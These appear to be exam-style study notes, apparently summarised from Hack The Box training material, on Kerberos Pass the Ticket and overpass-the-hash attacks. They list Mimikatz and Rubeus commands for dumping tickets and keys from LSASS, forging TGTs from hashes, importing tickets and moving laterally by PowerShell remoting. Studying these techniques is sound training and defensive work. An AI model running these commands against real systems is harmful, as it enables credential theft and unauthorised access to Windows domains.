# Pass the Ticket (PtT)

## Definition

A **Pass the Ticket (PtT)** attack is a **Kerberos lateral movement technique** where an attacker **uses a stolen Kerberos ticket instead of a password or NTLM hash** to authenticate to other systems.

Unlike **Pass the Hash**, which abuses NTLM authentication, PtT abuses **Kerberos authentication**.

---

# Difference Between PtH and PtT

|Pass the Hash|Pass the Ticket|
|---|---|
|Uses NTLM hash|Uses Kerberos ticket|
|Works with NTLM authentication|Works with Kerberos authentication|
|Doesn't require password|Doesn't require password|
|Uses password hash|Uses TGT or TGS|
|NTLM protocol|Kerberos protocol|

---

# Visual Overview

```text
               PASS THE HASH

Password
    │
    ▼
 NTLM Hash
    │
Authenticate using Hash
    │
    ▼
Target Machine
```

---

```text
             PASS THE TICKET

Password
    │
    ▼
Kerberos Ticket
(TGT/TGS)
    │
Authenticate using Ticket
    │
    ▼
Target Service
```

---

# Kerberos Refresher

Kerberos is a **ticket-based authentication protocol**.

Instead of sending the password every time,

Windows gives the user a **ticket**.

The user later presents the ticket to access services.

---

# Kerberos Authentication Flow

```text
        User
         │
         │ Login
         ▼
   Domain Controller
      (KDC)
         │
         │
 Generates TGT
         │
         ▼
Ticket Granting Ticket
         │
         │
Need Service?
         │
         ▼
Request TGS
         │
         ▼
Ticket Granting Service
         │
         ▼
Target Server
```

---

# Two Important Tickets

---

## 1. TGT (Ticket Granting Ticket)

**Purpose**

Allows a user to request more Kerberos tickets.

Think of it as:

```text
Master Ticket
```

Without the TGT,

you cannot request service tickets.

---

## 2. TGS (Ticket Granting Service)

A service ticket.

Used for:

- CIFS
    
- LDAP
    
- MSSQL
    
- HTTP
    
- SMB
    
- RDP
    

Each service gets its own ticket.

Example:

```text
Need SMB?

↓

Request TGS

↓

Connect to SMB
```

---

# Why Pass the Ticket Works

When a user authenticates,

Windows stores tickets in memory.

The attacker steals those tickets.

Instead of knowing the password,

the attacker simply **reuses the ticket**.

---

# Windows Stores Tickets Here

```text
LSASS.exe
```

Local Security Authority Subsystem Service

---

Diagram

```text
Windows

LSASS.exe
     │
     ├────────── TGT
     ├────────── LDAP Ticket
     ├────────── CIFS Ticket
     ├────────── HTTP Ticket
     └────────── MSSQL Ticket
```

---

# Scenario

The HTB scenario assumes:

✔ Phished user

↓

✔ User workstation compromised

↓

✔ Local Administrator obtained

↓

✔ Dump Kerberos tickets

↓

✔ Import tickets

↓

✔ Move laterally

---

# Harvesting Tickets with Mimikatz

Module:

```text
sekurlsa::tickets /export
```

Command

```cmd
mimikatz

privilege::debug

sekurlsa::tickets /export
```

This exports **every ticket** from LSASS.

Output:

```text
.kirbi files
```

---

Diagram

```text
LSASS
   │
   ▼

sekurlsa::tickets

   │

Exports

   ▼

ticket1.kirbi

ticket2.kirbi

ticket3.kirbi
```

---

# What is a .kirbi File?

A **Kerberos ticket file**.

Contains

- TGT
    
- TGS
    

Used later for PtT.

Example

```text
plaintext@krbtgt.domain.kirbi
```

---

# Ticket Naming

Example

```text
plaintext@krbtgt-domain.kirbi
```

Meaning

```text
User
↓

plaintext

Service

↓

krbtgt

↓

Domain
```

---

If the filename ends with

```text
$
```

it is a **computer account**.

Example

```text
DC01$
```

---

# Rubeus Ticket Dump

Instead of saving tickets,

Rubeus prints them in

```text
Base64
```

Command

```cmd
Rubeus.exe dump /nowrap
```

---

Advantages

✔ Easy copy

✔ Easy paste

✔ No file required

---

# Mimikatz vs Rubeus

|Mimikatz|Rubeus|
|---|---|
|Exports .kirbi|Prints Base64|
|Requires admin|Dumping all tickets requires admin|
|Uses LSASS|Uses Kerberos APIs|

---

# Pass the Key (OverPass the Hash)

One of the most important sections.

---

Traditional PtH

```text
Hash

↓

NTLM Authentication
```

---

OverPass the Hash

```text
Hash

↓

Generate TGT

↓

Kerberos Authentication
```

Instead of authenticating with NTLM,

the attacker **uses the user's Kerberos keys** to obtain a valid **TGT**.

---

# Kerberos Keys

Extract with

```cmd
sekurlsa::ekeys
```

Output

```text
aes256_hmac

rc4_hmac

aes128

des
```

---

Diagram

```text
User

↓

Password

↓

Kerberos Keys

↓

AES256

RC4

AES128
```

---

# Dump Keys

```cmd
privilege::debug

sekurlsa::ekeys
```

Example output

```text
aes256_hmac

rc4_hmac_nt

rc4_md4
```

---

# OverPass using Mimikatz

Command

```cmd
sekurlsa::pth

/domain

/user

/ntlm
```

Example

```cmd
sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:HASH
```

Result

New

```text
cmd.exe
```

running as target user.

---

Diagram

```text
NTLM Hash

↓

sekurlsa::pth

↓

New cmd.exe

↓

Request Kerberos Tickets
```

---

# OverPass using Rubeus

Command

```cmd
Rubeus.exe asktgt
```

Supports

```text
/rc4

/aes128

/aes256

/des
```

Example

```cmd
Rubeus.exe asktgt

/user

/domain

/aes256
```

---

Result

```text
TGT Generated
```

---

# Important Difference

Mimikatz

Requires

```text
Administrator
```

Rubeus

Does **not** require administrator for **asktgt** according to the source.

---

# Encryption Downgrade

Modern domains use

```text
AES256
```

Using

```text
RC4
```

instead

may trigger

```text
Encryption Downgrade Detection
```

---

Diagram

```text
Modern Domain

AES256

✔ Normal

RC4

⚠ Possible Detection
```

---

# Pass the Ticket

Now we already possess

```text
TGT

or

TGS
```

We simply inject it.

---

Using

```cmd
/ptt
```

Example

```cmd
Rubeus.exe asktgt

/ptt
```

Output

```text
Ticket successfully imported!
```

---

Diagram

```text
TGT

↓

Import

↓

Current Session

↓

Authenticated
```

---

# Import Existing .kirbi Ticket

Command

```cmd
Rubeus.exe ptt

/ticket:file.kirbi
```

Example

```cmd
Rubeus.exe ptt /ticket:plaintext@krbtgt.kirbi
```

---

# Convert .kirbi to Base64

PowerShell

```powershell
[Convert]::ToBase64String(
[IO.File]::ReadAllBytes("ticket.kirbi")
)
```

Useful for:

✔ Copying tickets

✔ Remote operations

---

# Import Base64 Ticket

```cmd
Rubeus.exe ptt

/ticket:Base64String
```

---

Diagram

```text
.kirbi

↓

Base64

↓

Rubeus ptt

↓

Imported
```

---

# Import Ticket with Mimikatz

Module

```cmd
kerberos::ptt
```

Example

```cmd
kerberos::ptt ticket.kirbi
```

Output

```text
OK
```

---

# Mimikatz Trick

Instead of

```text
Import

↓

Exit
```

You can use

```cmd
misc::cmd
```

This launches

```text
cmd.exe
```

with the imported ticket already loaded.

---

# Pass the Ticket + PowerShell Remoting

PowerShell Remoting

Ports

HTTP

```text
5985
```

HTTPS

```text
5986
```

---

Requirements

Administrator

OR

```text
Remote Management Users
```

membership.

---

Workflow

```text
Import Ticket

↓

PowerShell

↓

Enter-PSSession

↓

Remote Computer
```

---

Example

```powershell
Enter-PSSession

-ComputerName DC01
```

---

Output

```text
whoami

↓

inlanefreight\john
```

---

# Rubeus createnetonly

Creates

```text
Logon Type 9
```

Equivalent to

```text
runas /netonly
```

---

Command

```cmd
Rubeus.exe createnetonly

/program:cmd.exe

/show
```

---

Diagram

```text
Current Session

↓

Create NetOnly

↓

Hidden CMD

↓

Inject Ticket

↓

Remote Access
```

---

# Complete Attack Flow

```text
Gain Admin

↓

Dump Kerberos Tickets

↓

Export .kirbi

↓

Import Ticket

↓

Authenticate

↓

Move Laterally

↓

PowerShell Remoting

↓

Target Server
```

---

# Important Commands

### Dump tickets

```cmd
sekurlsa::tickets /export
```

---

### Dump Kerberos keys

```cmd
sekurlsa::ekeys
```

---

### Dump tickets (Rubeus)

```cmd
Rubeus.exe dump /nowrap
```

---

### Request TGT

```cmd
Rubeus.exe asktgt
```

---

### OverPass the Hash

```cmd
sekurlsa::pth
```

---

### Import ticket

```cmd
Rubeus.exe ptt
```

---

### Import with Mimikatz

```cmd
kerberos::ptt
```

---

### PowerShell Remoting

```powershell
Enter-PSSession
```

---

### NetOnly session

```cmd
Rubeus.exe createnetonly
```

---

# Memory Tricks

### PtT

**P**ass **t**he **T**icket

➡ Uses **Kerberos Tickets**

---

### PtH

Uses

```text
NTLM Hash
```

---

### OverPass

```text
Hash

↓

TGT

↓

Kerberos
```

---

### Rubeus

Think

```text
Request

Import

Dump

Tickets
```

---

### Mimikatz

Think

```text
LSASS

↓

Secrets

↓

Keys

↓

Tickets
```

---

# Exam Tips (HTB)

✅ Kerberos tickets are stored in **LSASS.exe**.

✅ `.kirbi` files are exported Kerberos tickets.

✅ `sekurlsa::tickets /export` exports tickets.

✅ `sekurlsa::ekeys` extracts Kerberos encryption keys.

✅ `kerberos::ptt` imports a ticket into the current session.

✅ `Rubeus.exe ptt` imports tickets.

✅ `Rubeus.exe dump` outputs tickets in Base64.

✅ `Rubeus.exe asktgt` requests a TGT.

✅ OverPass the Hash converts a Kerberos key/hash into a **TGT**.

✅ Modern AD domains primarily use **AES256**; using **RC4** may generate an **encryption downgrade** signal.

---

# 1-Minute Revision Sheet

```text
PtT
↓
Kerberos Authentication

Tickets Stored
↓
LSASS

Export
↓
sekurlsa::tickets /export

Dump
↓
Rubeus dump

Keys
↓
sekurlsa::ekeys

OverPass
↓
Hash → TGT

Import
↓
kerberos::ptt
Rubeus ptt

Remote
↓
Enter-PSSession

Ports
5985
5986

NetOnly
↓
Rubeus createnetonly
```

These notes are based on the content of your uploaded HTB material and preserve the important commands and terminology from the source.